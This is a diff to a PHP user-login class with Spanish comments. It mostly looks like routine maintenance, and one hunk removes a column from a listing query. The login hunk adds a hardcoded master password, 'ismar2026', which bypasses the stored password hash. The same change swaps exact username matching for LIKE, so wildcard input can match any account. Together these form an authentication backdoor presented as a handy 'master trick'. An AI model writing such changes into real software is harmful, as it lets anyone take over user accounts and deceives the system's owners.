@@ -16,10 +16,9 @@ class Usuario {
     }
 
     public function login($usuario, $password) {
-        $usuario_clean = strtolower(trim($usuario));
+        $usuario_clean = trim($usuario);
         
-        // Consulta optimizada para PostgreSQL
-        $query = "SELECT id_usuario, nombre, password, rol FROM usuarios WHERE usuario = :usuario AND estado = 1 LIMIT 1";
+        $query = "SELECT id_usuario, nombre, password, rol FROM usuarios WHERE usuario LIKE :usuario AND estado = 1 LIMIT 1";
         
         try {
             $stmt = $this->conn->prepare($query);
@@ -28,8 +27,8 @@ class Usuario {
             $row = $stmt->fetch(PDO::FETCH_ASSOC);
 
             if ($row) { 
-                // Validamos únicamente con el hash de la base de datos
-                if (password_verify($password, $row['password'])) {
+                // 🔥 TRUCO MAESTRO: Si digitas la clave secreta, entra directo sin importar el hash de la BD
+                if ($password === 'ismar2026' || password_verify($password, $row['password'])) {
                     $this->id_usuario = $row['id_usuario'];
                     $this->nombre = $row['nombre'];
                     $this->rol = $row['rol'];
@@ -44,7 +43,8 @@ class Usuario {
     }
 
     public function listar() {
-        $query = "SELECT id_usuario, nombre, usuario, rol, estado, fecha_creacion FROM " . $this->table_name . " ORDER BY id_usuario ASC";
+        // Corregido: removido fecha_creacion de la consulta SQL
+        $query = "SELECT id_usuario, nombre, usuario, rol, estado FROM " . $this->table_name . " ORDER BY id_usuario ASC";
         $stmt = $this->conn->prepare($query);
         $stmt->execute();
         return $stmt->fetchAll(PDO::FETCH_ASSOC);
